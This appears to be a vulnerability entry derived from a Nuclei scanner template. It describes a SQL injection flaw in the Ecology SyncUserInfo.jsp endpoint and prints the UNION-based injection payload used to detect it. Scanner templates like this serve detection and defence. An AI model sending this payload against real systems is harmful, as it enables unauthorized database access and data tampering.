# Vulnerability: Ecology Syncuserinfo - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`ecology-syncuserinfo-sqli.yaml`)

## Description
Ecology Syncuserinfo contains a SQL injection vulnerability via a GET request. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/mobile/plugin/SyncUserInfo.jsp?userIdentifiers=-1)union(select(3),null,null,null,null,null,str(98989*44313),null
```

